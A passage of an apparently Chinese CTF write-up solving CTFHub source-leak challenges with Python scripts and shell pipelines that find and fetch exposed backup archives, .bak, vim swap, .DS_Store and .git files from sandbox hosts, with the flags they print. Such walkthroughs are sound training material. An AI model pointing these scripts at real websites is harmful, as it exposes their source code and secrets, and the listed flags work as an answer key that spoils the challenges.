punctuation">(</span><span class="token string">"访问的时候出现了问题"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        new_url <span class="token operator">=</span> url <span class="token operator">+</span> link<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>new_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"&lt;tr.*>(ctfhub{.*}) &lt;.*"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1c7fbb0f603c9e003a7cdec1a09b74fa8e95ea57<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、备份文件下载"><a href="#3、备份文件下载" class="headerlink" title="3、备份文件下载"></a>3、备份文件下载</h3><h4 id="3-1、网站源码"><a href="#3-1、网站源码" class="headerlink" title="3.1、网站源码"></a>3.1、网站源码</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:12</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> zipfile<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unzip_file</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    zip_src <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> name    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'unzip_folder'</span><span class="token punctuation">)</span>    r <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>is_zipfile<span class="token punctuation">(</span>zip_src<span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">:</span>        fz <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_src<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> file <span class="token keyword">in</span> fz<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            fz<span class="token punctuation">.</span>extract<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">"unzip_folder"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 解压%s到文件夹%s完成"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] 看起来解压的过程中出现了一点问题'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    folder <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\\"</span> <span class="token operator">+</span> <span class="token string">'unzip_folder'</span>    dir_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>folder<span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> dir_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">"index.html"</span><span class="token punctuation">:</span>            header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> line<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>            <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                flag <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">"^ctfhub{.*}"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>                <span class="token keyword">if</span> len<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 最终flag为："</span><span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">process_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name_list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'rar'</span><span class="token punctuation">,</span> <span class="token string">'tar.gz'</span><span class="token punctuation">,</span> <span class="token string">'tar'</span><span class="token punctuation">,</span> <span class="token string">'zip'</span><span class="token punctuation">]</span>    name_list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'web'</span><span class="token punctuation">,</span> <span class="token string">'website'</span><span class="token punctuation">,</span> <span class="token string">'backup'</span><span class="token punctuation">,</span> <span class="token string">'back'</span><span class="token punctuation">,</span> <span class="token string">'www'</span><span class="token punctuation">,</span> <span class="token string">'wwwroot'</span><span class="token punctuation">,</span> <span class="token string">'temp'</span><span class="token punctuation">]</span>    name_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> name1 <span class="token keyword">in</span> name_list1<span class="token punctuation">:</span>        <span class="token keyword">for</span> name2 <span class="token keyword">in</span> name_list2<span class="token punctuation">:</span>            name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>name2 <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> name1<span class="token punctuation">)</span>    <span class="token keyword">return</span> name_list<span class="token keyword">def</span> <span class="token function">get_zipfile</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 写入 %s完成！"</span> <span class="token operator">%</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    names <span class="token operator">=</span> process_name<span class="token punctuation">(</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-52e23664acf37dae.sandbox.ctfhub.com:10080/"</span>    <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">:</span>        header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"User-Agent"</span><span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> name<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>                content <span class="token operator">=</span> res<span class="token punctuation">.</span>content                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] 检测到了%s,正在下载..."</span> <span class="token operator">%</span> name<span class="token punctuation">)</span>                get_zipfile<span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span>                unzip_file<span class="token punctuation">(</span>name<span class="token punctuation">)</span>                get_flag<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">检测到了www.zip 正在下载<span class="token punctuation">..</span>.下载完成解压完成获取到的flag为：ctfhub<span class="token punctuation">{</span>a0f7e3a2630c76950dbceb4bad4f088cfd2efcb7<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2、bak文件"><a href="#3-2、bak文件" class="headerlink" title="3.2、bak文件"></a>3.2、bak文件</h4><p>​        当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/4/5 16:59</span><span class="token keyword">from</span> requests <span class="token keyword">import</span> RequestException<span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">get_user_agent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>    <span class="token punctuation">]</span>    <span class="token keyword">return</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://challenge-dc76a806659c9dd9.sandbox.ctfhub.com:10080/"</span>    bak <span class="token operator">=</span> <span class="token string">'index.php.bak'</span>    header <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> get_user_agent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> bak<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">except</span> RequestException<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">".*(ctfhub{.*})"</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>2235cea3ec81eb9569f4604251fe8a7120b95049<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-3、vim缓存"><a href="#3-3、vim缓存" class="headerlink" title="3.3、vim缓存"></a>3.3、vim缓存</h4><p>​        当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p><p>通常 <code>vim</code> 的备份文件有：</p><ol><li><strong><code>.filename.swp</code></strong></li><li><strong><code>filename~</code></strong></li><li><strong><code>.filename.un.~</code></strong></li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> ur<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse<span class="token keyword">import</span> zipfile<span class="token punctuation">,</span> os<span class="token keyword">import</span> rerr <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'\bctfhub{.*}'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>res <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-5aa8b1e1be6c5d78.sandbox.ctfhub.com:10080/.index.php.swp'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>rr<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>str<span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>67e244df614a707bf252d60711afef3767e41492<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-4、-DS-Store"><a href="#3-4、-DS-Store" class="headerlink" title="3.4、.DS_Store"></a>3.4、.DS_Store</h4><p>​        <code>.DS_Store</code> 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p><p>这里通过下面的地址直接获取到文件</p><pre class="line-numbers language-bash"><code class="language-bash">http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/.DS_Store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后通过Linux命令获取文件内容</p><pre class="line-numbers language-bash"><code class="language-bash">xxd -p DS_Store <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/00//g'</span> <span class="token operator">|</span> <span class="token function">tr</span> -d <span class="token string">'\n'</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/\([0-9A-F]\{2\}\)/0x\1 /g'</span> <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> strings <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/ptb[LN]ustr//g'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到的结果如下</p><pre class="line-numbers language-bash"><code class="language-bash">Bud1DSDB<span class="token variable">$e536ae211065e6cb535b1a8080a2baa3</span>.txtnoteustrflag here<span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接着构建脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">as</span> urres <span class="token operator">=</span> ur<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'http://challenge-3092fd23a1d60f94.sandbox.ctfhub.com:10080/e536ae211065e6cb535b1a8080a2baa3.txt'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到的结果是</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>b00feb505c3f4e6df73d8612c76bd5deb5aa4475<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、Git泄露"><a href="#4、Git泄露" class="headerlink" title="4、Git泄露"></a>4、Git泄露</h3><h4 id="4-1、Log"><a href="#4-1、Log" class="headerlink" title="4.1、Log"></a>4.1、Log</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-426b1b2da4ddd315.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token 